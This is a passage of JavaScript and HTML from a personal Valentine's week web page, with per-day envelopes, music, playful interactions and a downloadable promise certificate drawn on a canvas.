                showPopup(`Ye din (${currentData.date}) abhi nahi aaya hai.<br>Sabar ka phal meetha hota hai meri jaan!`);
                return;
            }

            // === NEW: CHANGE SONG PER DAY ===
            const audio = document.getElementById('bgMusic');
            const targetSong = daySongs[currentData.id] || defaultSong;

            // Sirf tab change karein agar gaana alag ho
            if (audio.getAttribute('src') !== targetSong) {
                audio.src = targetSong;
                audio.play().catch(e => console.log("Audio play error:", e));
                isPlaying = true; // Icon update karne ke liye
            }

            document.documentElement.style.setProperty('--highlight', currentData.color);
            document.documentElement.style.setProperty('--envelope-main', currentData.color);
            document.documentElement.style.setProperty('--envelope-flap', adjustColor(currentData.color, -20));
            
            document.getElementById('day-title').innerText = currentData.title;
            document.getElementById('day-photo').src = currentData.innerImage;
            document.getElementById('typewriter-text').innerText = "";

            // --- RENDER UNIQUE INTERACTION ---
            renderInteraction(currentData.id);
            
            menuScreen.style.display = 'none';
            letterScreen.style.display = 'flex';
            env.style.display = 'block';
            env.classList.remove('open');
            card.classList.remove('show');
        }

        function handleEnvelopeClick() {
            const dayId = currentData.id;
            const isVerified = localStorage.getItem('verified_day_' + dayId);
            
            if (isVerified === 'true') {
                openEnvelope();
            } else {
                initFingerprintVerification();
            }
        }

        function openEnvelope() {
            if (isEnvelopeOpening) return;
            isEnvelopeOpening = true;
            env.classList.add('open');
            setTimeout(() => {
                try { burstConfetti(); } catch(e) { console.log("Confetti error", e); }
                env.style.display = 'none';
                
                // Chocolate Day: 2 Minutes Silence (Only Music)
                if (currentData.id === 9) {
                    const activeDayId = currentData.id;
                    setTimeout(() => {
                        // Ensure we are still on the same day and screen is visible
                        if (currentData.id !== activeDayId || letterScreen.style.display === 'none') return;

                        card.classList.add('show');
                        startTypewriter(currentData.msg);
                        
                        // Interaction fade in
                        const interact = document.getElementById('interaction-container');
                        interact.style.opacity = '0';
                        interact.style.transition = 'opacity 1s';
                        const delay = currentData.msg.length * 50 + 500;
                        setTimeout(() => { interact.style.opacity = '1'; }, delay);
                        
                        setTimeout(initScratchCard, 700);
                    }, 60000); // 120000 ms = 2 minutes
                    return;
                }

                card.classList.add('show');
                
                if (currentData.id === 8) {
                    handleProposeDaySequence();
                } else if (currentData.id === 10) {
                    // Teddy Day: Silence first
                    document.getElementById('typewriter-text').innerText = "";
                    setTimeout(() => startTypewriter(currentData.msg), 8000);
                    setTimeout(initScratchCard, 700);
                } else if (currentData.id === 11) {
                    // Promise Day: Silence first
                    document.getElementById('typewriter-text').innerText = "";
                    setTimeout(() => startTypewriter(currentData.msg), 7000);
                    setTimeout(initScratchCard, 700);
                } else if (currentData.id === 12) {
                    // Hug Day: Presence Logic
                    initHugDay();
                    // Skip scratch card for presence mode
                } else if (currentData.id === 13) {
                    // Kiss Day: One Kiss Only
                    initKissDay();
                } else if (currentData.id === 14) {
                    // Valentine's Day: The Day That Listens
                    initValentinesDay();
                } else {
                    startTypewriter(currentData.msg);
                    
                    // Chocolate Day: Show interaction AFTER text finishes
                    if (currentData.id === 9) {
                        const interact = document.getElementById('interaction-container');
                        interact.style.opacity = '0';
                        interact.style.transition = 'opacity 1s';
                        const delay = currentData.msg.length * 50 + 500;
                        setTimeout(() => { interact.style.opacity = '1'; }, delay);
                    }
                    
                    setTimeout(initScratchCard, 700);
                }
            }, 800);
        }

        function startTypewriter(text) {
            const el = document.getElementById('typewriter-text');
            el.innerText = "";
            let i = 0;
            clearInterval(typeInterval);
            typeInterval = setInterval(() => {
                if(i < text.length) { el.innerText += text.charAt(i); i++; } 
                else { clearInterval(typeInterval); }
            }, 50);
        }

        function goBack() {
            letterScreen.style.display = 'none';
            menuScreen.style.display = 'block';
            
            // Clear all timers to prevent overlapping text
            clearTimeout(proposeTimer1);
            clearTimeout(proposeTimer2);
            clearInterval(proposeTypeInterval);
            clearTimeout(vdayTimer1);
            clearTimeout(vdayTimer2);
            clearTimeout(vdayTimer3);
            clearTimeout(vdayTimer4);
            clearTimeout(kissTimer);
            clearTimeout(promiseHoldTimer);
            clearInterval(promiseStrengthInterval);
            promiseHoldStart = 0;

            const promiseSeal = document.querySelector('.promise-seal');
            if (promiseSeal) promiseSeal.classList.remove('holding');

            clearInterval(typeInterval);
            document.removeEventListener('click', placeKiss); // Cleanup kiss mode
            document.body.style.cursor = "default";
            
            // Cleanup Propose Day & Reset UI
            const msgBox = document.querySelector('.message-text');
            msgBox.innerHTML = '<span id="typewriter-text"></span><span class="cursor"></span>';
            document.getElementById('day-title').style.opacity = '1';
            document.querySelector('.content p').style.opacity = '1';
            document.getElementById('interaction-container').style.opacity = '1';
            
            // Restore Display (Fix for VDay cleanup)
            document.getElementById('day-title').style.display = 'block';
            document.querySelector('.content p').style.display = 'block';
            
            document.getElementById('interaction-container').style.pointerEvents = 'auto';
            cleanupHugDay();
            cleanupKissDay();
            
            // Cleanup Valentine's Day
            document.querySelector('.back-btn').style.display = 'block';
            document.querySelector('.letter-card').classList.remove('alive-state');
        }

        function toggleMusic() {
            if(isPlaying) { audio.pause(); } else { audio.play(); }
            isPlaying = !isPlaying;
        }

        // === SURPRISE FUNCTIONS ===
        function moveNoBtn() {
            const btn = document.getElementById('noBtn');
            const x = Math.random() * 150 - 75; // Random move left/right
            const y = Math.random() * 150 - 75; // Random move up/down
            btn.style.transform = `translate(${x}px, ${y}px)`;
        }

        function acceptProposal() {
            burstConfetti();
            showPopup("I knew it! Love you forever!");
            document.getElementById('interaction-container').innerHTML = "<b style='color: #ff4d6d; font-size: 1.2rem;'>She said YES!</b>";
        }

        // === RENDER UNIQUE INTERACTIONS ===
        function renderInteraction(id) {
            const container = document.getElementById('interaction-container');
            container.innerHTML = '';

            if (id === 7) { // Rose Day: Blooming Rose
                container.innerHTML = `
                    <div id="rose-game" class="rose-stage" onclick="growRose()" style="font-size: 4rem; text-align: center;">üå±</div>
                    <p style="font-size: 0.8rem; margin-top: 5px;">Tap to water & bloom</p>
                `;
            } 
            else if (id === 8) { // Propose Day: Yes/No
                container.innerHTML = `
                    <button class="choice-btn btn-yes" onclick="acceptProposal()">YES!</button>
                    <button class="choice-btn btn-no" id="noBtn" onmouseover="moveNoBtn()" ontouchstart="moveNoBtn()">NO</button>
                `;
            }
            else if (id === 9) { // Chocolate Day: Eat Pieces
                let pieces = '';
                for(let i=0; i<9; i++) pieces += `<div class="choco-piece" onclick="eatPiece(this)"></div>`;
                container.innerHTML = `
                    <div class="choco-grid" id="choco-grid">${pieces}</div>
                    <div id="secret-choco-msg" class="secret-choco-msg">You were meant to look closer.</div>
                    <p style="font-size: 0.8rem; margin-top: 5px;" id="choco-hint">Tap pieces to eat<br><span class="secret-hint-text">Some things aren‚Äôt meant to be seen immediately‚Ä¶</span></p>
                    <div class="choco-btn-container" id="choco-end-btns" style="display:none;">
                        <button class="choco-btn eat" onclick="resetChoco()">Eat Again üç´</button>
                        <button class="choco-btn share" onclick="shareChoco()">Share It üíå</button>
                    </div>
                `;
                setTimeout(initSecretChocoFeature, 100);
            }
            else if (id === 10) { // Teddy Day: Squeeze
                container.innerHTML = `
                    <div class="teddy-wrapper" id="teddy-wrapper" 
                         onmousedown="startTeddyHold(event)" ontouchstart="startTeddyHold(event)"
                         onmouseup="endTeddyHold()" ontouchend="endTeddyHold()" onmouseleave="endTeddyHold()">
                        <div style="font-size: 5rem; user-select: none;">üß∏</div>
                        <div class="teddy-glow"></div>
                    </div>
                    <div class="teddy-msg" id="teddy-msg"></div>
                `;
            }
            else if (id === 11) { // Promise Day: Wax Seal
                container.innerHTML = `
                    <div id="promise-container" class="promise-container">
                        <div class="promise-strength" id="promise-strength">
                            <div class="promise-strength-head">
                                <span>Promise Strength</span>
                                <span id="promise-strength-percentage">0%</span>
                            </div>
                            <div class="promise-strength-track">
                                <div class="promise-strength-fill" id="promise-strength-fill"></div>
                            </div>
                            <p class="promise-strength-note" id="promise-strength-note">Press and hold the seal to forge this promise.</p>
                        </div>
                        <div class="promise-seal" 
                             onmousedown="startPromiseHold(event)" ontouchstart="startPromiseHold(event)"
                             onmouseup="cancelPromiseHold()" ontouchend="cancelPromiseHold()" onmouseleave="cancelPromiseHold()">
                            <svg class="promise-seal-icon" viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3 3.1-3s3.1 1.29 3.1 3v2z"/></svg>
                        </div>
                        <div class="promise-msg" id="promise-msg"></div>

                        <div class="promise-certificate-panel" id="promise-certificate-panel">
                            <h4 class="promise-cert-heading">Digital Promise Certificate</h4>
                            <div class="promise-cert-form">
                                <input id="certificate-your-name" class="promise-cert-input" type="text" maxlength="40" placeholder="Your name">
                                <input id="certificate-name" class="promise-cert-input" type="text" maxlength="40" placeholder="Partner name">
                                <select id="certificate-promise-select" class="promise-cert-select">
                                    <option value="I will always choose you, every single day.">Always choose you, every single day</option>
                                    <option value="I will protect your smile in every season.">Protect your smile in every season</option>
                                    <option value="I will listen with patience, even in hard moments.">Listen with patience in hard moments</option>
                                    <option value="I will stand beside you in every storm.">Stand beside you in every storm</option>
                                    <option value="I will keep your secrets safe in my heart.">Keep your secrets safe</option>
                                    <option value="I will love you loudly and gently.">Love you loudly and gently</option>
                                </select>
                                <textarea id="certificate-custom-line" class="promise-cert-textarea" maxlength="180" placeholder="Custom promise line (editable)"></textarea>
                            </div>
                            <div class="promise-cert-btn-row">
                                <button class="promise-cert-btn generate" id="generate-certificate-btn" onclick="generatePromiseCertificate()">Generate</button>
                                <button class="promise-cert-btn share" id="share-certificate-btn" onclick="sharePromiseCertificate()" disabled>Share</button>
                                <button class="promise-cert-btn download" id="download-certificate-btn" onclick="downloadPromiseCertificate()" disabled>Download</button>
                            </div>
                            <p class="promise-cert-status" id="promise-certificate-status">Seal the promise first to unlock your certificate.</p>

                            <div class="promise-certificate-preview" id="promise-certificate-preview" style="display:none;">
                                <div class="promise-certificate-paper" id="promise-certificate-paper">
                                    <p class="promise-cert-title">Certificate of Promise</p>
                                    <p class="promise-cert-subtitle">THIS IS TO HONOR A HEARTFELT COMMITMENT</p>
                                    <p class="promise-cert-couple" id="promise-cert-preview-couple">Your Name ‚ù§ Partner Name</p>
                                    <p class="promise-cert-name" id="promise-cert-preview-name">My Love</p>
                                    <p class="promise-cert-body" id="promise-cert-preview-text">I will always choose you, every single day.</p>
                                    <div class="promise-cert-footer">
                                        <div>
                                            <div class="promise-cert-date" id="promise-cert-preview-date">Date</div>
                                            <div class="promise-seal-mark">SEAL</div>
                                        </div>
                                        <div class="promise-cert-sign">
                                            <span>Signed with love</span>
                                            <strong id="promise-cert-preview-sign">Forever Yours</strong>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                `;
                initPromiseDay();
            }
            else if (id === 12) { // Hug Day: Screen Hug
                container.innerHTML = `
                    <div class="hug-text" id="hug-text"></div>
                `;
                // Warmth overlay is injected in initHugDay
            }
            else if (id === 13) { // Kiss Day: Kiss Stamper
                container.innerHTML = `
                    <div id="kiss-interaction" class="kiss-container">
                        <div id="kiss-text" class="kiss-text"></div>
                    </div>
                `;
            } else if (id === 14) { // Valentine's Day
                container.innerHTML = `
                    <div id="vday-stage" class="vday-container"></div>
                `;
            }
        }

        // === PROPOSE DAY SEQUENCE ===
        const PROPOSE_CONFIG = {
            silenceDuration: 6000, // 6s silence
            courageTypingSpeed: 80, // Slow typing
            pauseAfterCourage: 2000, // 2s pause
        };

        function handleProposeDaySequence() {
            // Hide elements
            const title = document.getElementById('day-title');
            const sig = document.querySelector('.content p');
            const interact = document.getElementById('interaction-container');
            const msgBox = document.querySelector('.message-text');
            
            title.style.opacity = '0';
            sig.style.opacity = '0';
            interact.style.opacity = '0';
            interact.style.pointerEvents = 'none';
            
            // Clear default text structure temporarily
            msgBox.innerHTML = '';

            // 1. Silence Phase
            proposeTimer1 = setTimeout(() => {
                // 2. Courage Line
                const courageText = "Some questions need courage‚Ä¶ not answers.";
                const courageEl = document.createElement('div');
                courageEl.className = 'courage-line';
                msgBox.appendChild(courageEl);

                let i = 0;
                proposeTypeInterval = setInterval(() => {
                    courageEl.textContent += courageText.charAt(i);
                    i++;
                    if (i >= courageText.length) {
                        clearInterval(proposeTypeInterval);
                        
                        // 3. Pause
                        proposeTimer2 = setTimeout(() => {
                            // 4. Proposal Reveal
                            const finalEl = document.createElement('div');
                            finalEl.className = 'proposal-final';
                            finalEl.innerText = currentData.msg;
                            msgBox.appendChild(finalEl);

                            // Trigger Fade In
                            requestAnimationFrame(() => finalEl.classList.add('visible'));

                            // Restore UI
                            setTimeout(() => {
                                title.style.transition = 'opacity 2s'; title.style.opacity = '1';
                                sig.style.transition = 'opacity 2s'; sig.style.opacity = '1';
                                interact.style.transition = 'opacity 2s'; interact.style.opacity = '1';
                                interact.style.pointerEvents = 'auto';
                            }, 2000);

                        }, PROPOSE_CONFIG.pauseAfterCourage);
                    }
                }, PROPOSE_CONFIG.courageTypingSpeed);

            }, PROPOSE_CONFIG.silenceDuration);
            
            setTimeout(initScratchCard, 700);
        }

        // --- INTERACTION LOGIC ---
        let roseStage = 0;
        function growRose() {
            const el = document.getElementById('rose-game');
            roseStage++;
            if(roseStage === 1) el.innerHTML = "üåø";
            else if(roseStage === 2) el.innerHTML = "üå∑";
            else if(roseStage === 3) {
                el.innerHTML = ICONS.rose; // Final Rose
                el.style.color = "#e01e37";
                el.style.transform = "scale(1.5)";
                burstConfetti();
                showPopup("Your love makes my life bloom! üåπ");
            }
        }

        const COMPLIMENTS = ["Your Smile", "Your Eyes", "My Heart", "Your Laugh", "Your Kindness", "Your Hugs", "Your Love", "Your Voice", "Your Soul"];

        function resetChoco() {
            renderInteraction(9);
        }

        function shareChoco() {
            // To redirect to a specific number, use: https://wa.me/919876543210?text=...
            const text = encodeURIComponent("Happy Chocolate Day! You are sweeter than any chocolate! üç´‚ù§Ô∏è");
            window.location.href = `https://wa.me/917081160639?text=${text}`;
        }

        function eatPiece(el) {
            if (el.classList.contains('eaten')) return;
            
            // Play Sound
            const audio = new Audio('crunch.mp3');
            audio.volume = 0.5;
            audio.play().catch(e => console.log("Audio play error", e));

            el.classList.add('eaten');
            
            // Show Floating Compliment
            const rect = el.getBoundingClientRect();
            const text = document.createElement('div');
            text.className = 'floating-compliment';
            text.innerText = COMPLIMENTS[Math.floor(Math.random() * COMPLIMENTS.length)];
            text.style.position = 'fixed';
            text.style.left = (rect.left + rect.width / 2) + 'px';
            text.style.top = (rect.top + rect.height / 2) + 'px';
            text.style.zIndex = '1000'; // Ensure above letter screen
            document.body.appendChild(text);
            setTimeout(() => text.remove(), 2000);

            const remaining = document.querySelectorAll('.choco-piece:not(.eaten)').length;
            if(remaining === 0) {
                setTimeout(() => {
                    showPopup("You are sweeter than any chocolate! üç´");
                    burstConfetti();
                    document.getElementById('choco-grid').style.display = 'none';
                    document.getElementById('choco-hint').style.display = 'none';
                    document.getElementById('choco-end-btns').style.display = 'flex';
                }, 800);
            }
        }

        // === TEDDY DAY LOGIC ===
        let teddyHoldStart = 0;
        let teddyHoldTimer = null;
        let teddyTotalHold = 0;
        let teddyMessageShown = false;
        const TEDDY_THRESHOLD = 3500;

        function startTeddyHold(e) {
            if(e.type === 'touchstart') e.preventDefault();
            teddyHoldStart = Date.now();
            const wrapper = document.getElementById('teddy-wrapper');
            wrapper.classList.add('holding');
            
            teddyHoldTimer = setTimeout(() => {
                const msg = document.getElementById('teddy-msg');
                if (!teddyMessageShown) {
                    msg.innerText = "Comfort doesn‚Äôt need words.";
                    msg.classList.add('visible');
                    teddyMessageShown = true;
                }
            }, TEDDY_THRESHOLD);
        }

        function endTeddyHold() {
            if (!teddyHoldStart) return;
            const duration = Date.now() - teddyHoldStart;
            teddyTotalHold += duration;
            teddyHoldStart = 0;
            clearTimeout(teddyHoldTimer);
            
            const wrapper = document.getElementById('teddy-wrapper');
            wrapper.classList.remove('holding');
            
            if (duration > TEDDY_THRESHOLD) {
                localStorage.setItem('teddy_hold_duration', teddyTotalHold);
                const msg = document.getElementById('teddy-msg');
                if (msg.innerText !== "You stayed longer than you think.") {
                    setTimeout(() => {
                        msg.style.opacity = '0';
                        setTimeout(() => {
                            msg.innerText = "You stayed longer than you think.";
                            msg.classList.add('visible');
                        }, 1000);
                    }, 1000);
                }
            }
        }

        // === PROMISE DAY LOGIC ===
        const PROMISE_CONFIG = { holdDuration: 4500, silenceDuration: 7000 };
        const PROMISE_CERTIFICATE_KEY = 'promise_certificate_data';
        let promiseHoldStart = 0;
        let promiseHoldTimer = null;
        let promiseStrengthInterval = null;
        let isPromiseSealed = false;

        function clampNumber(value, min, max) {
            return Math.max(min, Math.min(max, value));
        }

        function formatPromiseCertificateDate(timeValue) {
            return new Date(timeValue).toLocaleDateString('en-US', {
                day: '2-digit',
                month: 'long',
                year: 'numeric'
            });
        }

        const LEGACY_FIXED_PROMISE_CERT_DATE_TEXT = '08 April 2025';
        const LEGACY_FIXED_PROMISE_CERT_TIMESTAMP = new Date(2025, 3, 8, 12, 0, 0).getTime(); // 8 April 2025 (local noon)

        function setPromiseCertificateStatus(message, isError = false) {
            const statusEl = document.getElementById('promise-certificate-status');
            if (!statusEl) return;
            statusEl.innerText = message;
            statusEl.style.color = isError ? '#d90429' : '#4f5d75';
        }

        function buildDefaultPromiseLine(yourName, partnerName, selectedTemplate) {
            const safeYourName = (yourName || '').trim() || 'Your Name';
            const safePartnerName = (partnerName || '').trim() || 'Partner Name';
            const safeTemplate = (selectedTemplate || 'I will always choose you, every single day.').trim();
            return `I, ${safeYourName}, promise ${safePartnerName} that ${safeTemplate}`;
        }

        function autofillPromiseLine(force = false) {
            const yourNameInput = document.getElementById('certificate-your-name');
            const partnerNameInput = document.getElementById('certificate-name');
            const promiseSelect = document.getElementById('certificate-promise-select');
            const customLineInput = document.getElementById('certificate-custom-line');

            if (!yourNameInput || !partnerNameInput || !promiseSelect || !customLineInput) return;

            const userEdited = customLineInput.dataset.userEdited === 'true';
            if (!force && userEdited) return;

            customLineInput.value = buildDefaultPromiseLine(
                yourNameInput.value,
                partnerNameInput.value,
                promiseSelect.value
            );
            customLineInput.dataset.userEdited = 'false';
        }

        function attachPromiseLineAutofillListeners() {
            const yourNameInput = document.getElementById('certificate-your-name');
            const partnerNameInput = document.getElementById('certificate-name');
            const promiseSelect = document.getElementById('certificate-promise-select');
            const customLineInput = document.getElementById('certificate-custom-line');

            if (!yourNameInput || !partnerNameInput || !promiseSelect || !customLineInput) return;

            const refreshDefault = () => autofillPromiseLine(false);
            yourNameInput.addEventListener('input', refreshDefault);
            partnerNameInput.addEventListener('input', refreshDefault);
            promiseSelect.addEventListener('change', refreshDefault);

            customLineInput.addEventListener('input', () => {
                customLineInput.dataset.userEdited = 'true';
            });
            customLineInput.addEventListener('blur', () => {
                if (!customLineInput.value.trim()) {
                    customLineInput.dataset.userEdited = 'false';
                    autofillPromiseLine(true);
                }
            });
        }

        function setPromiseStrength(value, noteText) {
            const safeValue = Math.round(clampNumber(value, 0, 100));
            const fill = document.getElementById('promise-strength-fill');
            const percentage = document.getElementById('promise-strength-percentage');
            const note = document.getElementById('promise-strength-note');
            const meter = document.getElementById('promise-strength');

            if (fill) {
                fill.style.width = safeValue + '%';
                if (safeValue < 35) fill.style.background = 'linear-gradient(90deg, #adb5bd, #6c757d)';
                else if (safeValue < 70) fill.style.background = 'linear-gradient(90deg, #8ecae6, #219ebc)';
                else fill.style.background = 'linear-gradient(90deg, #4cc9f0, #0077b6)';
            }
            if (percentage) percentage.innerText = safeValue + '%';
            if (note && typeof noteText === 'string') note.innerText = noteText;
            if (meter) meter.classList.toggle('complete', safeValue >= 100);
        }

        function enablePromiseCertificateActions(isEnabled) {
            const shareBtn = document.getElementById('share-certificate-btn');
            const downloadBtn = document.getElementById('download-certificate-btn');
            if (shareBtn) shareBtn.disabled = !isEnabled;
            if (downloadBtn) downloadBtn.disabled = !isEnabled;
        }

        function getStoredPromiseCertificate() {
            try {
                const rawData = localStorage.getItem(PROMISE_CERTIFICATE_KEY);
                if (!rawData) return null;

                const parsedData = JSON.parse(rawData);
                if (!parsedData || typeof parsedData !== 'object') return null;

                const hasLegacyDate =
                    parsedData.dateText === LEGACY_FIXED_PROMISE_CERT_DATE_TEXT ||
                    parsedData.createdAt === LEGACY_FIXED_PROMISE_CERT_TIMESTAMP;

                if (hasLegacyDate) {
                    const migratedAt = Date.now();
                    parsedData.createdAt = migratedAt;
                    parsedData.dateText = formatPromiseCertificateDate(migratedAt);
                    localStorage.setItem(PROMISE_CERTIFICATE_KEY, JSON.stringify(parsedData));
                }

                return parsedData;
            } catch (error) {
                console.error('Could not parse saved promise certificate:', error);
                return null;
            }
        }

        function isPromiseCertificateReady(data) {
            return Boolean(
                data &&
                typeof data.partnerName === 'string' &&
                data.partnerName.trim() &&
                typeof data.promiseLine === 'string' &&
                data.promiseLine.trim()
            );
        }

        function renderPromiseCertificate(data) {
            const preview = document.getElementById('promise-certificate-preview');
            const coupleEl = document.getElementById('promise-cert-preview-couple');
            const nameEl = document.getElementById('promise-cert-preview-name');
            const textEl = document.getElementById('promise-cert-preview-text');
            const dateEl = document.getElementById('promise-cert-preview-date');
            const signEl = document.getElementById('promise-cert-preview-sign');

            if (!preview || !coupleEl || !nameEl || !textEl || !dateEl || !signEl) return;

            const yourName = (
                (typeof data.yourName === 'string' && data.yourName.trim()) ||
                (typeof data.signedBy === 'string' && data.signedBy.trim() && data.signedBy !== 'Forever Yours') ||
                'Your Name'
            );
            const partnerName = (data.partnerName || 'Partner Name').trim() || 'Partner Name';
            const promiseText = (data.promiseLine || '').trim() || 'I will always choose you, every single day.';
            const dateText = data.dateText || formatPromiseCertificateDate(Date.now());

            coupleEl.innerText = `${yourName} ‚ù§ ${partnerName}`;
            nameEl.innerText = partnerName;
            textEl.innerText = promiseText;
            dateEl.innerText = dateText;
            signEl.innerText = yourName;
            preview.style.display = 'block';
            enablePromiseCertificateActions(true);
        }

        function initializePromiseCertificateForm() {
            const yourNameInput = document.getElementById('certificate-your-name');
            const nameInput = document.getElementById('certificate-name');
            const promiseSelect = document.getElementById('certificate-promise-select');
            const customLineInput = document.getElementById('certificate-custom-line');
            const preview = document.getElementById('promise-certificate-preview');

            if (!yourNameInput || !nameInput || !promiseSelect || !customLineInput) return;

            const saved = getStoredPromiseCertificate();
            customLineInput.dataset.userEdited = 'false';

            if (isPromiseCertificateReady(saved)) {
                const savedSigner = (
                    (saved.yourName || '').trim() ||
                    ((saved.signedBy || '').trim() !== 'Forever Yours' ? (saved.signedBy || '').trim() : '')
                );
                yourNameInput.value = savedSigner;
                nameInput.value = saved.partnerName || '';
                if (
                    saved.selectedTemplate &&
                    Array.from(promiseSelect.options).some(opt => opt.value === saved.selectedTemplate)
                ) {
                    promiseSelect.value = saved.selectedTemplate;
                }
                if ((saved.customLine || '').trim()) {
                    customLineInput.value = saved.customLine;
                    customLineInput.dataset.userEdited = 'true';
                } else {
                    autofillPromiseLine(true);
                }
                attachPromiseLineAutofillListeners();
                renderPromiseCertificate(saved);
                setPromiseCertificateStatus('Certificate restored. You can share or download it.');
                return;
            }

            if (!promiseSelect.value && promiseSelect.options.length) {
                promiseSelect.value = promiseSelect.options[0].value;
            }
            autofillPromiseLine(true);
            attachPromiseLineAutofillListeners();
            if (preview) preview.style.display = 'none';
            enablePromiseCertificateActions(false);
            setPromiseCertificateStatus('Default line is pre-filled. Edit it if needed, then tap Generate.');
        }

        function setPromiseCertificateUnlocked(isUnlocked) {
            const panel = document.getElementById('promise-certificate-panel');
            const generateBtn = document.getElementById('generate-certificate-btn');
            const preview = document.getElementById('promise-certificate-preview');

            if (!panel) return;
            panel.classList.toggle('active', isUnlocked);

            if (generateBtn) generateBtn.disabled = !isUnlocked;

            if (!isUnlocked) {
                enablePromiseCertificateActions(false);
                if (preview) preview.style.display = 'none';
                setPromiseCertificateStatus('Seal the promise first to unlock your certificate.');
                return;
            }
            initializePromiseCertificateForm();
        }

        function collectPromiseCertificateData() {
            if (!isPromiseSealed) {
                setPromiseCertificateStatus('Seal your promise first.', true);
                return null;
            }

            const yourNameInput = document.getElementById('certificate-your-name');
            const nameInput = document.getElementById('certificate-name');
            const promiseSelect = document.getElementById('certificate-promise-select');
            const customLineInput = document.getElementById('certificate-custom-line');

            if (!yourNameInput || !nameInput || !promiseSelect || !customLineInput) return null;

            const rawYourName = yourNameInput.value.trim().slice(0, 40);
            const rawPartnerName = nameInput.value.trim().slice(0, 40);
            const yourName = rawYourName || 'Your Name';
            const partnerName = rawPartnerName || 'Partner Name';
            const selectedTemplate = promiseSelect.value.trim();
            const customLine = customLineInput.value.trim().slice(0, 180);
            const fallbackLine = buildDefaultPromiseLine(yourName, partnerName, selectedTemplate);
            const promiseLine = (customLine || fallbackLine).trim();

            if (!promiseLine) {
                setPromiseCertificateStatus('Please select or write a promise line.', true);
                return null;
            }

            // Keep form synced with resolved defaults so Download/Share always works.
            if (!rawYourName) yourNameInput.value = yourName;
            if (!rawPartnerName) nameInput.value = partnerName;
            if (!customLine) {
                customLineInput.value = fallbackLine;
                customLineInput.dataset.userEdited = 'false';
            }

            const createdAt = Date.now();
            return {
                yourName,
                partnerName,
                selectedTemplate,
                customLine,
                promiseLine,
                createdAt,
                dateText: formatPromiseCertificateDate(createdAt),
                signedBy: yourName
            };
        }

        function generatePromiseCertificate() {
            const data = collectPromiseCertificateData();
            if (!data) return null;

            localStorage.setItem(PROMISE_CERTIFICATE_KEY, JSON.stringify(data));
            renderPromiseCertificate(data);
            if (data.yourName === 'Your Name' || data.partnerName === 'Partner Name') {
                setPromiseCertificateStatus('Certificate ready. Tip: add both real names for a personalized version.');
            } else {
                setPromiseCertificateStatus('Certificate is ready. Share it or download it.');
            }
            if (navigator.vibrate) navigator.vibrate(40);
            return data;
        }

        function ensurePromiseCertificateData() {
            const yourNameInput = document.getElementById('certificate-your-name');
            const nameInput = document.getElementById('certificate-name');
            const promiseSelect = document.getElementById('certificate-promise-select');
            const customLineInput = document.getElementById('certificate-custom-line');
            const saved = getStoredPromiseCertificate();
            if (yourNameInput && nameInput && promiseSelect && customLineInput) {
                const yourName = yourNameInput.value.trim().slice(0, 40) || 'Your Name';
                const partnerName = nameInput.value.trim().slice(0, 40) || 'Partner Name';
                const selectedTemplate = promiseSelect.value.trim();
                const customLine = customLineInput.value.trim().slice(0, 180);
                const fallbackLine = buildDefaultPromiseLine(yourName, partnerName, selectedTemplate);
                const promiseLine = (customLine || fallbackLine).trim();
                const hasCurrentFormData = Boolean(promiseLine);
                const savedSigner = (
                    ((saved && saved.yourName) || '').trim() ||
                    (((saved && saved.signedBy) || '').trim() !== 'Forever Yours' ? ((saved && saved.signedBy) || '').trim() : '')
                );

                if (hasCurrentFormData) {
                    if (
                        isPromiseCertificateReady(saved) &&
                        savedSigner === yourName &&
                        saved.partnerName === partnerName &&
                        saved.promiseLine === promiseLine
                    ) {
                        return saved;
                    }
                    return generatePromiseCertificate();
                }
            }

            if (isPromiseCertificateReady(saved)) return saved;
            return generatePromiseCertificate();
        }

        function splitTextIntoLines(drawCtx, text, maxWidth) {
            const words = (text || '').split(/\s+/).filter(Boolean);
            if (!words.length) return [''];
            const lines = [];
            let currentLine = words[0];

            for (let i = 1; i < words.length; i++) {
                const testLine = currentLine + ' ' + words[i];
                if (drawCtx.measureText(testLine).width <= maxWidth) currentLine = testLine;
                else {
                    lines.push(currentLine);
                    currentLine = words[i];
                }
            }
            lines.push(currentLine);
            return lines;
        }

        function drawWrappedCanvasText(drawCtx, text, x, y, maxWidth, lineHeight) {
            const lines = splitTextIntoLines(drawCtx, text, maxWidth);
            lines.forEach((line, index) => drawCtx.fillText(line, x, y + (index * lineHeight)));
            return y + (lines.length * lineHeight);
        }

        function drawCertificateCorner(drawCtx, x, y, size, flipX, flipY) {
            drawCtx.save();
            drawCtx.translate(x, y);
            drawCtx.scale(flipX, flipY);
            drawCtx.beginPath();
            drawCtx.moveTo(0, 0);
            drawCtx.bezierCurveTo(size * 0.08, size * 0.03, size * 0.3, size * 0.08, size * 0.42, size * 0.22);
            drawCtx.bezierCurveTo(size * 0.5, size * 0.33, size * 0.4, size * 0.47, size * 0.24, size * 0.43);
            drawCtx.stroke();
            drawCtx.restore();
        }

        function createPromiseCertificateCanvas(data) {
            const canvas = document.createElement('canvas');
            canvas.width = 1600;
            canvas.height = 1100;
            const drawCtx = canvas.getContext('2d');
            const width = canvas.width;
            const height = canvas.height;
            const yourName = (
                (typeof data.yourName === 'string' && data.yourName.trim()) ||
                (typeof data.signedBy === 'string' && data.signedBy.trim() && data.signedBy !== 'Forever Yours') ||
                'Your Name'
            );
            const partnerName = (data.partnerName || 'Partner Name').trim() || 'Partner Name';
            const promiseText = (data.promiseLine || '').trim() || 'I will always choose you, every single day.';
            const dateText = data.dateText || formatPromiseCertificateDate(Date.now());

            const paperGradient = drawCtx.createLinearGradient(0, 0, 0, height);
            paperGradient.addColorStop(0, '#f9efd8');
            paperGradient.addColorStop(0.5, '#f2e1bf');
            paperGradient.addColorStop(1, '#e8cf9f');
            drawCtx.fillStyle = paperGradient;
            drawCtx.fillRect(0, 0, width, height);

            for (let i = 0; i < 2600; i++) {
                const x = Math.random() * width;
                const y = Math.random() * height;
                const alpha = Math.random() * 0.06;
                drawCtx.fillStyle = `rgba(125, 93, 72, ${alpha})`;
                drawCtx.fillRect(x, y, 1, 1);
            }

            drawCtx.strokeStyle = '#7f5539';
            drawCtx.lineWidth = 6;
            drawCtx.strokeRect(52, 52, width - 104, height - 104);

